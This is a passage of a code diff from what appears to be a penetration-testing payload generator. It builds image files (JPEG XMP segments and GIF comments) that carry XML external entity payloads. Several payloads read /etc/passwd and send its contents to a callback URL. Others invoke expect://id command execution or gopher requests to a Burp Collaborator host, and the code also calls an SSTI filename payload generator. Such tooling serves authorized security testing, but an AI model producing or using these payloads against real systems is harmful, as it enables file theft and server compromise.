+                2: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp">%remote;]><xmp>test</xmp>''',
+                3: f'''<!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-file?%file;">%remote;]><xmp>test</xmp>''',
+                4: f'''<!DOCTYPE x [<!ENTITY % ext SYSTEM "{base_url}/xxe-xmp-param">%ext;]><xmp>&data;</xmp>''',
+                5: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-nested"><!ENTITY % nested "<!ENTITY &#37; send SYSTEM '{base_url}/xxe-xmp-nested-send?%remote;'>">%nested;%send;]><xmp>test</xmp>''',
+                6: f'''<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY % remote SYSTEM "{base_url}/xxe-svg">%remote;]><rect width="100" height="100"/></svg>''',
+                7: f'''<!DOCTYPE x [<!ENTITY % data SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSB4IFNZU1RFTSAie2Jhc2VfdXJsfS94eGUtZGF0YSI+JXg7"><!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-data?%data;">%remote;]><xmp>test</xmp>''',
+                8: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "expect://id">%remote;]><xmp>test</xmp>''',
+                9: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "gopher://{burp_collab}/xxe-gopher">%remote;]><xmp>test</xmp>''',
+                10: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-php">%remote;]><xmp>test</xmp>''',
+                11: f'''<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-text">%x;]><x>test</x>'''
+            }
+            
+            xxe_names = {
+                1: "itxt", 2: "xmp_entity", 3: "xmp_file", 4: "xmp_param",
+                5: "xmp_nested", 6: "svg_itxt", 7: "xmp_data", 8: "xmp_expect",
+                9: "xmp_gopher", 10: "xmp_phpfilter", 11: "text_chunk"
+            }
+            
+            if ext == 'jpg' or ext == 'jpeg':
+                for xxe_num in range(1, 12):
+                    if xxe_num in xxe_payloads:
+                        xxe_suffix = xxe_names.get(xxe_num, f"xxe{xxe_num}")
+                        img_path = xxe_dir / f"xxe{xxe_num}_{xxe_suffix}_app1.{file_ext}"
+                        img.save(img_path, img_format)
+                        with open(img_path, 'rb') as f:
+                            img_data = bytearray(f.read())
+                        
+                        xmp_payload = f'''<?xml version="1.0"?>
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+<rdf:Description rdf:about="">
+<dc:title>{xxe_payloads[xxe_num]}</dc:title>
+</rdf:Description>
+</rdf:RDF>
+</x:xmpmeta>'''.encode('utf-8')
+                        
+                        app1_marker = b'\xFF\xE1'
+                        app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
+                        app1_length = struct.pack('>H', len(xmp_payload) + len(app1_identifier) + 2)
+                        app1_chunk = app1_marker + app1_length + app1_identifier + xmp_payload
+                        
+                        soi_pos = img_data.find(b'\xFF\xD8')
+                        if soi_pos != -1:
+                            insert_pos = soi_pos + 2
+                            img_data[insert_pos:insert_pos] = app1_chunk
+                        
+                        with open(img_path, 'wb') as f:
+                            f.write(img_data)
+            
+            elif ext == 'gif':
+                for xxe_num in range(1, 12):
+                    if xxe_num in xxe_payloads:
+                        xxe_suffix = xxe_names.get(xxe_num, f"xxe{xxe_num}")
+                        comment_extension = b'\x21\xFE'
+                        comment_payload = xxe_payloads[xxe_num].encode('utf-8')
+                        comment_length = bytes([min(len(comment_payload), 255)])
+                        comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                        gif_content = gif_header + comment_chunk + gif_trailer
+                        with open(xxe_dir / f"xxe{xxe_num}_{xxe_suffix}_comment.gif", 'wb') as f:
+                            f.write(gif_content)
+    
     if generate_ssti_filename_payloads and should_generate_type('ssti'):
         generate_ssti_filename_payloads(output_dir, ext, burp_collab, tech_filter)
     
